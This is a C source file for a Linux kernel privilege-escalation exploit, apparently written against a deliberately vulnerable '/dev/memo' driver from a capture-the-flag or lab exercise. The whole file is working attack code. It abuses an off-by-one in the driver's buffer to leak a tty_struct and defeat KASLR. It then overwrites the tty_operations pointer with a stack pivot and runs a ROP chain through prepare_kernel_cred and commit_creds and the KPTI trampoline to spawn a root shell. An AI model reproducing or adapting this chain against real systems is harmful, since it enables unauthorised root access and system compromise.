#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

#include "exploit.h"

#define MAX_SIZE 1024

#define OFF_TTY_OPS 0xe65900 // offset of tty_operations in tty_struct from _stext
#define OFF_CC 0x07b8b0 // commit_creds
#define OFF_PKC 0x07bb50 // prepare_kernel_cred

#define OFF_STACKLIFT 0x94d4e3 // push r12; add; pop rsp; pop r13; ret;
#define POP_RDI_RET 0x1268 // pop rdi; ret;
#define POP_RCX_RET 0x4c852 // pop rcx; ret;
#define MOV_RDI_RAX 0x19dcb // mov rdi, rax; rep movsq; ret;
#define KPTI_TRAMPOLINE 0xa00a2f

int FD;
unsigned long user_cs, user_ss, user_sp, user_rflags;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;" // setting intel syntax
        "mov user_cs, cs;" // saving address of code segment
        "mov user_ss, ss;" // saving address of stack segment
        "mov user_sp, rsp;" // saving stack pointer
        "pushf;" // push flag register onto stack
        "pop user_rflags;" // saving flag register
        ".att_syntax;"        
    );
}

void spawn_shell(){
    printf("[+] Returned to userland, spawning root shell...\n");
    if(getuid() == 0){
        printf("[+] Privilege level successfully escalated, spawning shell...\n");
	char *arg[2] = {"/bin/sh", NULL};
        execve("/bin/sh", arg, NULL);
	exit(0);
    }else{
        printf("[-] Failed to escalate privileges, exiting...\n");
        exit(-1);
    }
}

void read_driver(char *to, int len){
	int ret;

	ret = read(FD, to, len);
	if(ret < 0){
		printf("[-] Error while reading from driver\n");
		perror("driver read");
		exit(-1);
	}
}

void write_driver(char *from, int len){
	int ret;

	ret = write(FD, from, len);
	if(ret < 0){
		printf("[-] Error while writing to driver\n");
		perror("driver write");
		exit(-1);
	}
}

void driver_seek_to_end(){
	int ret;

	ret = lseek(FD, 0x400-1, SEEK_SET);
	if(ret < 0){
		printf("[-] Error while seeking to end\n");
		perror("seek end");
		exit(-1);
	}
}

void driver_seek_to_begin(){
	int ret;

	ret = lseek(FD, 0, SEEK_SET);
	if(ret < 0){
		printf("[-] Error while seeking to begin\n");
		perror("seek begin");
		exit(-1);
	}
}

void dump_memory(char *buff, int num){
	unsigned long *conv = (unsigned long *)buff;
	if(num > MAX_SIZE / 8){
		printf("[-] dump_memory: too much for num\n");
		return;
	}
	printf("********************************************\n");
	for(int i = 0; i+1 < num; i+=2){
		printf("%16lx\t%16lx\n", conv[i], conv[i+1]);
	}
	printf("********************************************\n");
}

int allocate_tty_struct(){
	int ret;

	ret = open("/dev/ptmx", O_RDWR | O_NOCTTY);
	if(ret < 0){
		printf("[-] Failed to allocate tty_struct\n");
		perror("tty_struct");
	}
	return ret;
}

void main(){
	char recv[MAX_SIZE] = {0};
	char distilled[MAX_SIZE] = {0};
	unsigned long payload[128] = {0};
	int ttyfd;
	unsigned int off = 0;
	unsigned long base, heap;
	struct tty_operations ops;

	for(int i = 0; i < 128; i++){
		payload[i] = 0x4141414141414141;
	}

	printf("[+] Opening device file\n");

	FD = open("/dev/memo", O_RDWR);
	if(FD < 0){
		printf("[-] Failed to open device file\n");
		perror("opening file");
		exit(-1);
	}

	printf("[+] Filling with 0x41..\n");
	write_driver((char*)payload, MAX_SIZE);

	driver_seek_to_end();

	printf("[+] Allocating tty_struct...\n");
	ttyfd = allocate_tty_struct();

	printf("[+] Reading out of the allocated memory\n");
	read_driver(recv, MAX_SIZE);

	for(int i=0; i < MAX_SIZE - 1; i++){
		distilled[i] = recv[i+1];
	}

	printf("[+] Memory dump from heap:\n");
	dump_memory(distilled, 10);
	base = ((unsigned long*)distilled)[3] - OFF_TTY_OPS;
	heap = ((unsigned long*)distilled)[7] - 0x38 - MAX_SIZE;

	printf("[+] tty_operations address: 0x%16lx\n", ((unsigned long*)distilled)[3]);
	printf("[+] Base kernel address: 0x%16lx\n", base);
	printf("[+] Kernel heap address: 0x%16lx\n", heap);

	ops.ioctl = (void*)(base + OFF_STACKLIFT);

	driver_seek_to_begin();

	save_state();

	payload[off++] = 0;
	payload[off++] = base + POP_RDI_RET;
	payload[off++] = 0;
	payload[off++] = base + OFF_PKC;
	payload[off++] = base + POP_RCX_RET;
	payload[off++] = 0;
	payload[off++] = base + MOV_RDI_RAX;
	payload[off++] = base + OFF_CC;
	payload[off++] = base + KPTI_TRAMPOLINE + 22;
	payload[off++] = 0;
	payload[off++] = 0;
	payload[off++] = (unsigned long)spawn_shell;
	payload[off++] = user_cs;
	payload[off++] = user_rflags;
	payload[off++] = user_sp;
	payload[off++] = user_ss;

	memcpy((char*)payload + (off * sizeof(unsigned long)), &ops, sizeof(ops));
	unsigned long offs_addr = heap + (off * sizeof(unsigned long));

	printf("[+] Sending ROP code\n");
	write_driver((char*)payload, MAX_SIZE);

	driver_seek_to_end();
	((unsigned long*)distilled)[3] = offs_addr;
	for(int i = 0; i < MAX_SIZE-1; i++){
		recv[i+1] = distilled[i];
	}

	printf("[+] Sending payload\n");
	write_driver(recv, MAX_SIZE);

	printf("[+] Triggering exploit\n");
	ioctl(ttyfd, heap, heap);

	printf("[-] Something went wrong...\n");

	close(FD);
}